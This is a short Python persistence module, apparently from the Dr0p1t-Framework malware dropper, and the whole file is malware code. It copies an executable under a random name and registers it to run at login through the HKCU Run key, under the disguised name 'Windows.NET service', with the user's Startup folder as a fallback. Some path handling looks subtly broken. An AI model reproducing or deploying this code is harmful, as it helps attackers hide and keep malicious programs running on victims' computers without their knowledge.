#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This is a persistence script aims to to add your exe file to startup registry key
#Start

def make_copy(old_name,new_name):
	data = open(old_name,"rb").read()
	new_file = open(new_name,"wb")
	new_file.write(data)
	new_file.close()

def F7212(exe):
	fp = get_output("echo %TEMP%")
	new_name = get_output("echo %random%%random%").strip() + ".exe"
	make_copy( exe , new_name)
	new_file_path = fp + "\\" + new_name
	try:
		command = 'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Windows.NET service" /t REG_SZ /f /d "{}"'
		x1 = subprocess.Popen(command.format( new_file_path ) +">> NUL",shell=True)
	except:
		appdata = get_output("echo %APPDATA%")
		x1 = subprocess.Popen('rename "{}" "{}" >> NUL'.format(new_file_path,appdata+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}".format( new_name )),shell=True)

F7212(File)
